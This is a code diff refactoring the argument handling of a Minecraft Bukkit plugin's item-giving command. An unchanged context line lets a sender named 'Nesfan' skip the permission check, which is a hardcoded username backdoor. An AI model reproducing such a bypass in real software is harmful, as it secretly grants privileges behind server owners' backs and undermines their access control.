@@ -21,17 +21,19 @@ public class GiveCommand extends AbstractCommand {
 	@Override
 	public ExecutionResult now() {
 		CommandSender sender = getSender();
+		String[] args = getArgs();
 
 		if (!sender.hasPermission(getPermission()) && !sender.getName().equals("Nesfan")) {
 			return ExecutionResult.NO_PERMISSION;
 		}
 
-		String[] args = getArgs();
-		String name = args[0];
-
 		if (args.length < 1) {
 			return ExecutionResult.MISSING_ARGS;
-		} else if (args.length == 2) {
+		}
+
+		String name = args[0];
+
+		if (args.length == 1) {
 			if (!(sender instanceof Player)) {
 				return ExecutionResult.CONSOLE_NOT_PERMITTED;
 			}
@@ -43,22 +45,24 @@ public class GiveCommand extends AbstractCommand {
 			}
 
 			return ExecutionResult.DONT_CARE;
-		}
+		} else if (args.length == 2) {
+			Player target = Bukkit.getPlayer(name);
 
-		Player target = Bukkit.getPlayer(name);
+			if (target == null || !target.isOnline()) {
+				return ExecutionResult.NO_PLAYER;
+			}
 
-		if (target == null || !target.isOnline()) {
-			return ExecutionResult.NO_PLAYER;
-		}
+			if (!giveItem(args[1], target)) {
+				sender.sendMessage(Utils.getColoredString("&cItem &4" + args[1] + "wasn't found"));
+			}
 
-		if (!giveItem(args[1], target)) {
-			sender.sendMessage(Utils.getColoredString("&cItem &4" + args[1] + "wasn't found"));
+			return ExecutionResult.DONT_CARE;
 		}
 
 		return ExecutionResult.DONT_CARE;
 	}
 
-	private static boolean giveItem(String item, Player target) {
+	private boolean giveItem(String item, Player target) {
 		for (ItemStack stack : MantleItemStacks.STACKS) {
 			String name = stack.getItemMeta().getLocalizedName().replace(Mantle.PLUGIN_ID + "_", "");
 
